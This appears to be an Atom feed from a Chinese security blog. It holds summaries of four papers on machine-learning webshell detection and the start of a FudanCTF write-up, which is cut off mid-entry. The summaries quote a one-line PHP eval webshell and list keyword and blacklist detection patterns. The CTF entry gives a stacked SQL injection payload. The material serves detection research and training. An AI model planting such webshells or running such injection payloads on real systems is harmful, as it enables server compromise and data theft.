<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sky&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://skysec.top/"/>
  <updated>2020-01-14T06:15:32.281Z</updated>
  <id>http://skysec.top/</id>
  
  <author>
    <name>一叶飘零</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Paper Summary &amp; Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</title>
    <link href="http://skysec.top/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest%E2%80%93Gradient-Boosting-Decision-Tree-Algorithm/"/>
    <id>http://skysec.top/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/</id>
    <published>2020-01-14T02:21:54.000Z</published>
    <updated>2020-01-14T06:15:32.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章《Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm》是和前一篇文章《Detecting Webshell Based on Random Forest with FastText》同一学校所作，研究问题依旧是检测webshell，两篇文章同样是利用了随机森林算法，前一篇结合的是fastText，而本篇文章结合的是梯度提升迭代决策树算法。</p><h2 id="研究方法"><a href="#研究方法" class="headerlink" title="研究方法"></a>研究方法</h2><p>在前一篇文章中，对于features的提取分为两大步：</p><ol><li>分析提取文件的静态特征</li><li>利用PHP-VLD获取文件的Opcode，利用fastText训练文本分类器模型<h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h3>而本篇文章中所用和其相似，但有所提升，作者在前一篇文章的基础上增加了如下文件的静态特征：<br>1.数据压缩比<br>由于base64方式压缩的webshell通常具有更均衡的特定字符分布，并且往往具有更高的数据压缩比，因此使用数据压缩比检测webshell，有一定的成效。<br>2.eval函数的使用<br>一句话木马的重要特性即eval，一般的一句话木马格式如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span> ($_post[xxxxx])</span><br></pre></td></tr></table></figure></li></ol><p>因此一个文件的eval的数量是模型训练的一个重要feature。<br>如此之外，之前的文章利用PHP-VLD提取文件Opcode，再使用fastText训练文本分类器，而本篇文章与之不同，作者将获得的Opcode，使用Scikit-learn从中提取2种特征：TF-IDF向量和Hash向量。</p><h3 id="TF-IDF-Vector"><a href="#TF-IDF-Vector" class="headerlink" title="TF-IDF Vector"></a>TF-IDF Vector</h3><p>TF即Term frequency，词频计算公式如下：<br><img src="/images/2020-01-14-10-54-31.png" alt=""><br>其用来评估一个词语在文本中出现的频率。<br>IDF即inverse document frequency，逆文本频率指数如下：<br><img src="/images/2020-01-14-10-55-28.png" alt=""><br>其用于评估该词语在所有文本中是否罕见。<br>故此TF-IDF的主要思想是：如果某个词或短语在一篇文章中出现的频率TF高，并且在其他文章中很少出现，则认为此词或者短语具有很好的类别区分能力，适合用来分类。<br>其计算方法如下：<br><img src="/images/2020-01-14-10-58-18.png" alt=""></p><h3 id="Hash-Vector"><a href="#Hash-Vector" class="headerlink" title="Hash Vector"></a>Hash Vector</h3><p>hash散列可以将任意长度的数据转换为固定长度的数据，同时这种这种转换通常是一对一的，我们很难找到同样的hash对应不同的数据。因此可以利用hash作为某个特征向量的索引，因此无需创建大型字典，而这个恰好是TF-IDF所缺乏的。<br>例如：特征 i 会被hash到索引位置j：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h(i) = j</span><br></pre></td></tr></table></figure></p><p>特征 i 的词频表示为φ(i)，那么公式如下：<br><img src="/images/2020-01-14-11-04-48.png" alt=""><br>在提取特征结束后，作者尝试在仅适用6个静态特征和GBDT算法进行检测,成功率已达96.9%。<br>对于GBDT算法，其核心是：每棵树学的是之前所有树结论和的残差，即真实值-预测值。每一轮梯度boosting训练都会减少上一轮训练的残差，即在梯度方向上训练一个新的模型来降低上一轮训练的残差。<br><img src="/images/2020-01-14-13-52-13.png" alt=""><br>其优点在于可以有效减少feature，降低过拟合现象，并且具有更高的鲁棒性，不太可能受到训练集规模的影响。<br>这也是作者将其与随机森林算法结合使用的一个原因。同时为了进一步提高效率,作者加入了PHP Opcode的特征提取，和随机森林算法：<br><img src="/images/2020-01-14-11-16-59.png" alt=""><br>在结合前6个静态特征后，作者使用随机森林获取TF-IDF矩阵和hash矩阵的预测结果，最后结合8个feature对GBDT进行训练。</p><h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2><p>作者从Github收集了2232个webshell，2388 CMS样本文件：<img src="/images/2020-01-14-11-07-23.png" alt=""><br>但由于有些文件提取特征不成功，或者并非php文件，作者丢弃了大小超过20000的文件，并未使用。<br>而后作者从如下几个角度评估了RF-GBDT算法的性能：<br><img src="/images/2020-01-14-11-09-56.png" alt=""><br><img src="/images/2020-01-14-11-10-08.png" alt=""><br>同时作者进行了一些对照实验，结果如下：<br><img src="/images/2020-01-14-11-12-34.png" alt=""><br><img src="/images/2020-01-14-14-13-26.png" alt=""><br>可以看到，如果仅用6个静态features的GBDT在各方面的性能都不如使用8个features的RF-GBDT。除此之外，作者还挑选了一些网上主流的webshell检测工具，结果如下：<br><img src="/images/2020-01-14-11-13-43.png" alt=""><br>这同时也证明了RF-GBDT具有非常好的性能。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇文章《Webshell Detection Based on Random Forest–Gradient Boosting Decis
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Evaluating CNN and LSTM for Web Attack Detection</title>
    <link href="http://skysec.top/2020/01/13/Paper-Summary-Evaluating-CNN-and-LSTM-for-Web-Attack-Detection/"/>
    <id>http://skysec.top/2020/01/13/Paper-Summary-Evaluating-CNN-and-LSTM-for-Web-Attack-Detection/</id>
    <published>2020-01-13T07:37:35.000Z</published>
    <updated>2020-01-14T06:16:08.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇paper来自ICMLC 2018，与前一篇文章《CNN-Webshell &amp; Malicious Web Shell Detection with Convolutional Neural Network》出自同一学校，应该是之前工作的改进版。其对于webshell的检测也是主要集中于HTTP Requests检测。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>与2017年的paper《CNN-Webshell: Malicious Web Shell Detection with Convolutional Neural Network》不同，作者在本篇文章中改良了之前对HTTP Requests流量文本分割，变为input的方式。<br>根据之前的工作，通过符号<code>\&amp;</code>进行分割后，每一个单词可以变为一个one-hot向量，对于一个长为L的序列，其可以得到一组one-hot向量：<br><img src="/images/2020-01-13-19-17-32.png" alt=""><br>但作者认为这样是非常浪费时间的，不仅其是高维向量，并且忽略了单词与单词之间的关系。受到word embedding的启发，作者将one-hot向量转换成一个低维连续向量：<br><img src="/images/2020-01-13-19-20-44.png" alt=""><br>其可以通过one-hot向量左乘权重矩阵来实现：<br><img src="/images/2020-01-13-19-21-35.png" alt=""><br>其中：<br><img src="/images/2020-01-13-19-21-44.png" alt="">，|V|是词汇表中唯一单词的数目。<br>对于矩阵M，其可以通过随机分配或学习具有一个隐藏层的网络来获得。在此作者通过输入一个词（一个one-hot向量）并输出下一个词（一个one-hot向量）来训练网络，以学习两个共现词之间的关系。同时经过实验，这样得到的矩阵M比随机分配具有更好的性能。<br>经过这样转换，之前的one-hot向量序列转换为如下矩阵：<br><img src="/images/2020-01-13-19-25-07.png" alt=""></p><h2 id="研究方法"><a href="#研究方法" class="headerlink" title="研究方法"></a>研究方法</h2><p>众所周知，CNN可以通过卷积层和池化层，提取较为重要的features，而LSTM可以存储长期依赖关系，那么很自然的想到，可以将二者融合，用来处理webshell检测的问题。<br><img src="/images/2020-01-13-16-49-26.png" alt=""><img src="/images/2020-01-13-16-49-41.png" alt=""><br>首先通过CNN的卷积，我们可以得到如下结果：<br><img src="/images/2020-01-13-19-10-26.png" alt=""><br>其中b是偏差，φ是非线性校正函数，n个滤波器为：<br><img src="/images/2020-01-13-19-10-42.png" alt=""><br>但是由于卷积层和池化层产生的结果是一个向量，并不能直接和LSTM进行结合，所以为了解决这个问题，作者将全局最大池替换为局部最大池，那么在t位置时，局部最大池的结果为：<br><img src="/images/2020-01-13-16-51-06.png" alt=""><br>故此我们可以得到一组新的向量：<br><img src="/images/2020-01-13-16-52-18.png" alt=""><br>此时：<br><img src="/images/2020-01-13-16-52-26.png" alt=""><br><img src="/images/2020-01-13-16-52-32.png" alt=""><br>那么此时，即可将gt序列输入LSTM，完成组合分类：<br><img src="/images/2020-01-13-16-44-43.png" alt=""><br>对于CNN+LSTM的算法，输入单词维数为40，每个序列固定长度为56个单词。对于CNN，其具有100个宽度为5的滤波器和一个大小为5的本地最大池层，然后使用rate为0.9的dropout层来抑制过拟合。并将输出输入LSTM，而对于LSTM，其隐藏变量维数为100，其最后的输出同样连接到rate为0.9的dropout层。</p><h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2><p>作者使用数据集为CSIC2010。在实验中，测试集中有超过36000个正常请求和25000个异常请求。异常请求包含大量的web攻击，如SQL注入、信息收集、文件泄漏、CRLF注入、XSS和参数篡改等。<br>同样的，本篇文章也将自己的算法与传统方法进行了比较，比较对象如下：</p><ul><li>Multinomial Naive Bayes (NB)</li><li>Linear Support Vector Machine (Linear SVM)</li><li>Neural Network (NN)</li><li>k-Nearest Neighbour (kNN)</li><li>Decision Tree (DT)<br>结果如下：<br><img src="/images/2020-01-13-16-42-34.png" alt=""><br>可以发现CNN+LSTM的算法取得了最好的性能。<br>同时由于卷积网络中滤波器的数目和滑动窗口的宽度是关键参数，因此作者测试了不同数量的滤波器和滤波器宽度。结果如下：<br><img src="/images/2020-01-13-16-22-30.png" alt=""><br>可以发现，对于滤波器数量，性能在100个时表现最好，而对于滤波器宽度，性能在5时达到高值，而后缓慢增长。<br>同时考虑到LSTM的关键参数是隐藏变量的维数，所以作者对于不同维数也做了相应的测试，结果如下：<br><img src="/images/2020-01-13-16-25-04.png" alt=""><br>可以发现维数在20~300这个区间内，LSTM的性能一直在提升，但是考虑到时间消耗会随维数上升而上升，所以需要权衡二者之前的关系，达到最佳性价比。<br>同时作者测试了不同局部最大池大小对CNN+LSTM的性能影响，结果如下：<br><img src="/images/2020-01-13-16-28-56.png" alt=""><br>可以发现，当本地最大池大小设置为3时，会取得最佳性能。<br>除此之外，针对于小规模的CSIC2010数据集，过拟合问题也是关注的一个点，作者使用dropout方法进行抑制拟合，并对其进行评估，结果如下：<br><img src="/images/2020-01-13-16-30-07.png" alt=""><br>可以发现LSTM对于dropout rate有较大的变化，而CNN和CNN+LSTM方法更加具有鲁棒性，其在rate大于0.3后，性能缓慢增长。<br>最后，对于前文所提到的矩阵M的获取也是一个关键因素，作者使用了随机分配和机器学习两种方式进行比对测试，结果如下：<br><img src="/images/2020-01-13-16-32-40.png" alt=""><br>不难发现经过机器学习后的模型拥有更好的性能。</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章将CNN和LSTM进行了结合，用于webshell检测，获得了不错的效果，同时分析了不同的因素对模型性能的影响，对后人工作具有一定的指导意义。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇paper来自ICMLC 2018，与前一篇文章《CNN-Webshell &amp;amp; Malicious Web Shell Dete
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Detecting Webshell Based on Random Forest with FastText</title>
    <link href="http://skysec.top/2020/01/13/Paper-Summary-Detecting-Webshell-Based-on-Random-Forest-with-FastText/"/>
    <id>http://skysec.top/2020/01/13/Paper-Summary-Detecting-Webshell-Based-on-Random-Forest-with-FastText/</id>
    <published>2020-01-13T05:57:50.000Z</published>
    <updated>2020-01-14T06:16:23.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇paper来自ICCAI 2018，采用了fastText和随机森林算法相结合的模型FRF-WD，使用一些静态features和PHP opcode，对Webshell进行检测。但与之前的文章不同，本篇文章不再是基于HTTP流量检测，而是针对文件进行检测。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Opcode是一种PHP脚本编译后的中间语言，对于PHP的语言引擎Zend执行代码，会经过如下4个步骤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.Scanning(Lexing) ,将PHP代码转换为语言片段(Tokens)</span><br><span class="line">2.Parsing, 将Tokens转换成简单而有意义的表达式</span><br><span class="line">3.Compilation, 将表达式编译成Opocdes</span><br><span class="line">4.Execution, 顺次执行Opcodes，每次一条，从而实现PHP脚本的功能。</span><br></pre></td></tr></table></figure></p><p>而现有的一些工作已经表明，通过opcodes的频率可以区分恶意软件和可信软件。虽然PHP Opcode不同于恶意软件识别中使用的Opcode，但是他们在本质上是一致的，故此，本篇文章想要借助PHP Opcode来对恶意php webshell文件进行检测。<br>PHP拥有拓展Vulcan Logic Disassembler (VLD)，其可以hook Zend引擎，方便我们dump出所有的opcodes，例如如下一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>如果我们运行该webshell，通过VLD，我们可以得到：<br><img src="/images/2020-01-13-14-28-06.png" alt=""><br>而作者正是想利用fastText和VLD得到的Opcode，训练文本分类器模型。</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>FRF-WD模型对于文件的特征提取，可以分为两大步：</p><ol><li>分析提取文件的静态特征</li><li>利用PHP-VLD获取文件的Opcode，利用fastText训练文本分类器模型。<br>然后再利用上述获取的特征作为随机森林的输入，训练一个webshell检测模型。<h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h3>对于文件的静态特征，作者选取了如下5种：<br>1.长字符串<br>为了bypass现有的webshell检测，大多数的webshell会进行混淆，其惯用技术是利用编码，如base64，但其缺点就是对于一个较短的webshell，会经过编码，拼接变成一个很长的字符串。并且只检测php tag中的长字符串，可以有效避免富文本，js，图片，video或是css文件的干扰。<br>2.信息熵（Information Entropy）<br>由于内容加密会增加信息熵，所以计算信息熵是检测加密webshell的一个非常好的手段。<br>3.IC（Index of Coincidence）<br>IC在分析自然语言明文和密文中非常有用，如果IC值较低，那么表明文件中可能存在混淆或加密。<br>4.关键词搜索<br>如果文本文件中存在敏感词，诸如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(), assert(), exec(), shell_exec(), passthru(), system(), show_source(), proc_open() and pcntl_exec()</span><br></pre></td></tr></table></figure></li></ol><p>则会被认为是一个可疑文件。<br>5.黑名单<br>如果文件中检测到诸如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">webshell by </span><br><span class="line">hack by</span><br><span class="line">bypass AV</span><br><span class="line">password is *</span><br><span class="line">etc .....</span><br></pre></td></tr></table></figure></p><p>那么可以认为其是一个可疑危险文件，因为一般正常文件的注释中不会存在这些语句。</p><h3 id="PHP-Opcode特征"><a href="#PHP-Opcode特征" class="headerlink" title="PHP Opcode特征"></a>PHP Opcode特征</h3><p>考虑到PHP文件可以利用PHP-VLD快速得到PHP Opcode，那么可以尝试使用文本分类器来识别webshell。在本文中选用了fastText模型来训练文本分类器。<br>fastText是一个快速文本分类算法，与基于神经网络的分类算法相比有两大优点：<br>1、fastText在保持高精度的情况下加快了训练速度和测试速度<br>2、fastText不需要预训练好的词向量，fastText会自己训练词向量<br>3、fastText两个重要的优化：Hierarchical Softmax、N-gram<br>同时，对于不同的文件，Opcode的数量可能只有少量，也可能有上千个，所以fastText比传统的深度学习方法TextCNN更适合处理这样的数据集。<br>工作大致分为3步：</p><ol><li>通过PHP-VLD，将PHP文件代码转化为PHP Opcode；</li><li>使用fastText和标记好的样本对文本分类器进行训练；</li><li>使用训练好的文本分类器去判断哪些标记过的文本来自PHP Opcode;<br>最终得到的预测值用于文件Opcode的特征值。<h3 id="分类器"><a href="#分类器" class="headerlink" title="分类器"></a>分类器</h3>在特征提取结束后，使用随机森林方法实现分类。<br>集成学习是通过建立几个模型组合的来解决单一预测问题。它的工作原理是生成多个分类器/模型，各自独立地学习和作出预测。这些预测最后结合成单预测，因此优于任何一个单分类的做出预测。<br>而随机森林是集成学习的一个子类，它依靠于决策树的投票选择来决定最后的分类结果。同时随机森林具有快速、高效、预测精度高等特点。同时其在生成过程中，能够获取到内部生成误差的一种无偏估计。<br><img src="/images/2020-01-13-15-24-43.png" alt=""></li></ol><h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2><p>作者收集了共计8521个PHP文件，其中包括1587个PHP Webshell，其来自于github上一些webshell Project。对于正常文件来自于几个著名PHP框架，例如Yii2、Wordpress、CI等。<br>对于数据集，30%用于构建PHP Opcode文本分类器，70%用于随机森林的训练和模型测试。<br>为了证明FRF-WD模型的性能，作者使用了如下几个公式进行评估：<br>TP：True Positive<br>TP是正确分类为webshell文件的个数。<br>TN：True Negative<br>FN是错误分类为良性文件的webshell文件的个数。<br><img src="/images/2020-01-13-15-12-15.png" alt=""><br><img src="/images/2020-01-13-15-12-21.png" alt=""><br><img src="/images/2020-01-13-15-12-27.png" alt=""><br>由于在fastText模型中，word-Ngram是一个重要参数，为了找到最适合的N-gram，作者测试了n=1 ~ n=6，效果如下：<br><img src="/images/2020-01-13-15-16-02.png" alt=""><br>可见最佳的N-gram是4-gram。<br>同时作者比较了随机森林模型，和随机森林与fastText相结合的模型性能的差异：<br><img src="/images/2020-01-13-15-17-50.png" alt=""><br><img src="/images/2020-01-13-15-19-16.png" alt=""><br>可见在不考虑PHP Opcode特征下，随机森林的准确率仅为88.97%，而在FRF-WD模型下，准确数在97.92%。同时ROC曲线也能说明FRF-WD模型拥有更好的性能。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本文与之前的工作不同，之前的webshell检测使用了CNN对text进行分类，而本文则使用了fastText和随机森林结合的方式进行webshell检测。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.laruence.com/2008/06/18/221.html" target="_blank" rel="noopener">http://www.laruence.com/2008/06/18/221.html</a><br><a href="https://blog.csdn.net/feilong_csdn/article/details/88655927" target="_blank" rel="noopener">https://blog.csdn.net/feilong_csdn/article/details/88655927</a><br><a href="https://www.cnblogs.com/gczr/p/7097704.html" target="_blank" rel="noopener">https://www.cnblogs.com/gczr/p/7097704.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇paper来自ICCAI 2018，采用了fastText和随机森林算法相结合的模型FRF-WD，使用一些静态features和PHP 
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; CNN-Webshell &amp; Malicious Web Shell Detection with Convolutional Neural Network</title>
    <link href="http://skysec.top/2020/01/09/Paper-Summary-CNN-Webshell-Malicious-Web-Shell-Detection-with-Convolutional-Neural-Network/"/>
    <id>http://skysec.top/2020/01/09/Paper-Summary-CNN-Webshell-Malicious-Web-Shell-Detection-with-Convolutional-Neural-Network/</id>
    <published>2020-01-09T02:23:34.000Z</published>
    <updated>2020-01-13T08:38:36.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇paper来自ICNCC 2017，论文中指出，本篇文章是第一篇将CNN应用到恶意webshell检测上的文章。其对于webshell的检测主要集中于HTTP Requests检测。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Webshell对网络服务会产生巨大的恶意作用，攻击者将Webshell上传至受害者服务器，达到持久化控制的目的。而本篇文章旨在检测恶意webshell，防止攻击者利用webshell进行二次攻击。<br>作者将检测放在HTTP Requests中，主要对用户的GET请求和POST请求进行检测分析。考虑到CNN在text分类上已经有重大突破，工具word2vec在text分类上已经有比较好的效果。<br>同时作者考虑到HTTP Requests流量和text很相似，但比较不同的是，HTTP Requests数据不同于普通的文本，它包含了许多的特殊符号，因此不能简单将word2vec迁移至HTTP Requests流量检测。</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>作者设计了如下一个CNN-webshell模型：</p><ul><li>数据输入层/ Input layer</li><li>卷积计算层/ CONV layer</li><li>ReLU激励层 / ReLU layer &amp; 池化层 / Pooling layer</li><li>全连接层 / FC layer<br><img src="/images/2020-01-10-11-06-09.png" alt=""><h3 id="数据输入层-Input-layer"><a href="#数据输入层-Input-layer" class="headerlink" title="数据输入层/ Input layer"></a>数据输入层/ Input layer</h3>在HTTP Requests流量中，文本没有空格进行分割，所以想要实现在text分类上应用比较好的技术，首先需要进行词切分。<br>作者发现，例如中国菜刀的流量中，有如下特征：其对于每个参数字符串，有很多部分被<code>\&amp;</code>分割开，同时在流量中还有许多诸如：<code>( ) {  }  /  \  @</code>的符号，这些符号也可用于文本的分割。<br><img src="/images/2020-01-09-10-40-29.png" alt=""><br>例如如上中国菜刀流量，作者可以利用特殊符号将其分割成如上文本。<br>然后作者将分割后的文本进行如下操作：<br>对于给定的一个单词i，作者给其对应的一个向量：<br><img src="/images/2020-01-10-10-38-45.png" alt=""><br>其中d为向量空间的维数。那么对于一个由n个单词组成的句子，它可以表示为如下矩阵：<br><img src="/images/2020-01-10-10-39-55.png" alt=""><br>这样一来，长度为n的句子，可以转化为大小为n<em>d的矩阵。同时，每一条句子的长度都规定为n，若不足n个单词的句子的会使用零向量进行补齐。如此一来，就可以得到n</em>d的矩阵输入。<h3 id="卷积计算层-CONV-layer"><a href="#卷积计算层-CONV-layer" class="headerlink" title="卷积计算层/ CONV layer"></a>卷积计算层/ CONV layer</h3>在这一个层，需要做局部关联，每个神经元看做一个滤波器filter：<br><img src="/images/2020-01-13-10-19-44.png" alt=""><br>此处h是滑动窗口的宽度，在当前环境里就是每次h个单词。此处作者使用的是1D卷积，即使用宽度为h的滑动窗口对每行进行卷积：<br><img src="/images/2020-01-13-11-15-57.png" alt=""><br>对于矩阵：<br><img src="/images/2020-01-13-10-20-49.png" alt=""><br>我们可以得到卷积结果为：<br><img src="/images/2020-01-13-10-21-07.png" alt=""><br>其中b是偏差，f是非线性校正函数。对于整个句子，其卷积结果是一个特征向量：<br><img src="/images/2020-01-13-10-22-11.png" alt=""><br>这一层我们可以简单理解，从输入的单词矩阵中提取features。<h3 id="ReLU激励层-ReLU-layer-amp-池化层-Pooling-layer"><a href="#ReLU激励层-ReLU-layer-amp-池化层-Pooling-layer" class="headerlink" title="ReLU激励层 / ReLU layer &amp; 池化层 / Pooling layer"></a>ReLU激励层 / ReLU layer &amp; 池化层 / Pooling layer</h3>在结束了卷积后，作者需要在feature map上选出最大值<img src="/images/2020-01-13-10-34-16.png" alt="">来作为和特定滤波器W对应的特征。<br>Max pooling的思想大致如下：<br><img src="/images/2020-01-13-13-51-33.png" alt=""><br>对于每个2<em>2的窗口选出最大的数作为输出矩阵的相应元素的值，比如输入矩阵第一个2</em>2窗口中最大的数是6，那么输出矩阵的第一个元素就是6，如此类推。<br>作者利用池化层获取的结果串联起来，得到特征向量Z：<br><img src="/images/2020-01-13-10-36-05.png" alt=""><br>再交由ReLU进行激活操作：<br><img src="/images/2020-01-13-10-37-24.png" alt=""><br>激励函数一般采用ReLU(The Rectified Linear Unit/修正线性单元)，原因是其收敛快，求梯度简单，但较脆弱。<br>在这一层中，我们可以简单理解成从众多的features中选出最有影响力的features，用以压缩数据和参数的量。<br><img src="/images/2020-01-13-16-38-34.png" alt=""><h3 id="全连接层-FC-layer"><a href="#全连接层-FC-layer" class="headerlink" title="全连接层 / FC layer"></a>全连接层 / FC layer</h3>两层之间所有神经元都有权重连接，通常全连接层在卷积神经网络尾部。也就是跟传统的神经网络神经元的连接方式是一样的：<br><img src="/images/2020-01-13-13-53-43.png" alt=""><br>在本层中，作者加入了Dropout来抑制过拟合问题。dropout是指在深度学习网络的训练过程中，对于神经网络单元，按照一定的概率将其暂时从网络中丢弃。每次做完dropout，相当于从原始的网络中找到一个更瘦的网络，如下图所示：<br><img src="/images/2020-01-13-10-47-14.png" alt=""><br>经过softmax函数后，结果输出是一个概率分布: 每个元素都是非负的, 并且所有元素的总和都是1。<br>softmax log-loss函数：<br><img src="/images/2020-01-13-10-51-32.png" alt=""><br>在本层中，我们可以理解为，在提取出众多的features后，我们需要做一个整合，对其进行权重划分，最后再进行判别。<h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2>作者收集了如下数据集：3691个webshell，3990个正常样本。<br>作者首先分析了工具word2vec的作用，word2vec生成的向量可用于度量词之间的相似性，我们从下图中可以看出，恶意操作词(webshell中常见的词)彼此非常接近，但正常的词则分散很远。<br><img src="/images/2020-01-09-10-40-14.png" alt=""><br>同时作者为了验证自己的模型的性能，其与几种经典的分类器做了对比：</li><li>Naive Bayes (NB)</li><li>k-Near Neighbour (kNN)</li><li>Decision Tree (DT)</li><li>Support Vector Machine (SVM)</li><li>traditional Neural Network (NN) using the TF-IDF feature representation<br>所有的分类器都使用相同的feature。<br><img src="/images/2020-01-13-11-05-05.png" alt=""><br>同时考虑到向量空间的维度对word2vec的能力有显著的影响，作者测试不同维数来评价其性能：<br><img src="/images/2020-01-13-11-10-35.png" alt=""><br>在维度200时，word2vec实现了最佳的性能。但是由于训练时间随维度增加而增加，还要考虑到效率问题。<br>所以最后作者证明了模型训练过程可以快速收敛：<br><img src="/images/2020-01-13-11-27-56.png" alt=""><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2>本篇paper基于word2vec和CNN提出了一种新型检测WebShell的技术，同时和其他经典分类器相比，取得了最好的性能。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇paper来自ICNCC 2017，论文中指出，本篇文章是第一篇将CNN应用到恶意webshell检测上的文章。其对于webshell的
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 FudanCTF Writeup</title>
    <link href="http://skysec.top/2019/12/13/2019-FudanCTF-Writeup/"/>
    <id>http://skysec.top/2019/12/13/2019-FudanCTF-Writeup/</id>
    <published>2019-12-13T14:41:26.000Z</published>
    <updated>2019-12-14T04:36:17.616Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近学校有招新赛，难度比较低。于是节选了几道稍微有点意思的题目记录一下。</p><h2 id="你再注试试"><a href="#你再注试试" class="headerlink" title="你再注试试"></a>你再注试试</h2><p>本题是一道Web堆叠查询注入题，改编自2019 强网杯online 随便注，在其基础上限制了多个关键词：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare、set、execute……</span><br></pre></td></tr></table></figure></p><p>但是我们可以利用mysql新特性handler：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dev.mysql.com/doc/refman/8.0/en/handler.html</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-14-12-09-03.png" alt=""><br>例如：<br><img src="/images/2019-12-14-12-31-18.png" alt=""><br>我们可以用如下方式查询：<br><img src="/images/2019-12-14-12-33-23.png" alt=""><br>最后写出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&apos;; handler `1919810931114514` open as `tgt`;handler `tgt` read next;--</span><br></pre></td></tr></table></figure></p><h2 id="ReSnAd"><a href="#ReSnAd" class="headerlink" title="ReSnAd"></a>ReSnAd</h2><p>本题是一道密码题，涉及RSA相关知识。题目提供了如下值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 